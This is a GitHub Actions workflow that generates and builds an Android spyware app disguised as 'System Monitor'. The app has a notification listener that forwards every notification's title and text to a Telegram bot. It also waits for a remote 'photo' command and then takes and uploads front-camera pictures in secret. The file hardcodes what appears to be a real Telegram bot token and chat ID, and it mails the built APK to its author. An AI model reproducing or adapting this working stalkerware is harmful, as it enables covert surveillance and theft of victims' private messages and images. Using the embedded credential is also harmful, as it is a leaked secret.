name: Hussein Spy Ultimate - Final

on:
  workflow_dispatch:

env:
  # بياناتك الشخصية مدمجة برمجياً
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🛠️ Create Full Project (Fixed Dependencies)
        run: |
          mkdir -p app/src/main/java/com/hussein/spy
          mkdir -p app/src/main/res/layout

          # 1. الإعدادات المستقرة
          cat <<EOF > settings.gradle
          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "HusseinSpy"
          include ':app'
          EOF

          # 2. ملف بناء المشروع الرئيسي
          cat <<EOF > build.gradle
          plugins { id 'com.android.application' version '8.2.0' apply false }
          EOF

          # 3. ملف بناء التطبيق (أضفنا مكتبة OkHttp هنا)
          cat <<EOF > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.hussein.spy'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.spy"
                  minSdk 21
                  targetSdk 34
                  versionCode 4
                  versionName "4.0"
              }
          }
          dependencies {
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF

          # 4. Manifest (تصاريح الكاميرا والإنترنت)
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-feature android:name="android.hardware.camera" />
              
              <application android:label="System Monitor" android:theme="@android:style/Theme.Material.Light">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".NotificationService"
                      android:label="Helper Service"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # 5. MainActivity (طلب التصاريح)
          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
          package com.hussein.spy;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.widget.Button;
          import android.view.Gravity;
          import android.widget.LinearLayout;
          import android.Manifest;

          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  LinearLayout layout = new LinearLayout(this);
                  layout.setOrientation(LinearLayout.VERTICAL);
                  layout.setGravity(Gravity.CENTER);
                  Button btn = new Button(this);
                  btn.setText("تفعيل كافة الصلاحيات");
                  btn.setOnClickListener(v -> {
                      requestPermissions(new String[]{Manifest.permission.CAMERA}, 1);
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  });
                  layout.addView(btn);
                  setContentView(layout);
              }
          }
          EOF

          # 6. الخدمة النهائية (تصوير + رفع حقيقي للصور)
          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
          package com.hussein.spy;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.graphics.SurfaceTexture;
          import android.hardware.Camera;
          import android.os.Bundle;
          import java.io.File;
          import java.io.FileOutputStream;
          import java.util.concurrent.TimeUnit;
          import okhttp3.*;

          public class NotificationService extends NotificationListenerService {
              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
              private final OkHttpClient client = new OkHttpClient();

              @Override
              public void onCreate() {
                  super.onCreate();
                  startPolling();
              }

              private void startPolling() {
                  new Thread(() -> {
                      while (true) {
                          try {
                              Request request = new Request.Builder()
                                  .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates")
                                  .build();
                              Response response = client.newCall(request).execute();
                              String body = response.body().string();
                              if (body.contains("\"text\":\"photo\"")) { takePhoto(); }
                              TimeUnit.SECONDS.sleep(10);
                          } catch (Exception e) { e.printStackTrace(); }
                      }
                  }).start();
              }

              private void takePhoto() {
                  try {
                      Camera camera = Camera.open(1); // الأمامية
                      camera.setPreviewTexture(new SurfaceTexture(0));
                      camera.startPreview();
                      camera.takePicture(null, null, (data, cam) -> {
                          try {
                              File file = new File(getCacheDir(), "capture.jpg");
                              FileOutputStream fos = new FileOutputStream(file);
                              fos.write(data);
                              fos.close();
                              uploadFile(file);
                              cam.release();
                          } catch (Exception e) { cam.release(); }
                      });
                  } catch (Exception e) { }
              }

              private void uploadFile(File file) {
                  RequestBody requestBody = new MultipartBody.Builder()
                      .setType(MultipartBody.FORM)
                      .addFormDataPart("chat_id", CHAT_ID)
                      .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg")))
                      .build();
                  Request request = new Request.Builder()
                      .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                      .post(requestBody)
                      .build();
                  new Thread(() -> { try { client.newCall(request).execute(); } catch (Exception e) { } }).start();
              }

              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String title = String.valueOf(sbn.getNotification().extras.get("android.title"));
                  String text = String.valueOf(sbn.getNotification().extras.get("android.text"));
                  String msg = "📩 *إشعار:* " + sbn.getPackageName() + "\n👤 " + title + "\n📝 " + text;
                  
                  Request request = new Request.Builder()
                      .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg + "&parse_mode=Markdown")
                      .build();
                  new Thread(() -> { try { client.newCall(request).execute(); } catch (Exception e) { } }).start();
              }
          }
          EOF

      - name: 🚀 Build APK
        run: |
          gradle wrapper
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: 📤 Send to Hussein
        run: |
          APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
            -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -F "document=@$APK_FILE" \
            -F "caption=✅ تم حل كافة الأخطاء يا حسين! النسخة الآن تدعم سحب الإشعارات وأمر التصوير photo بنجاح."
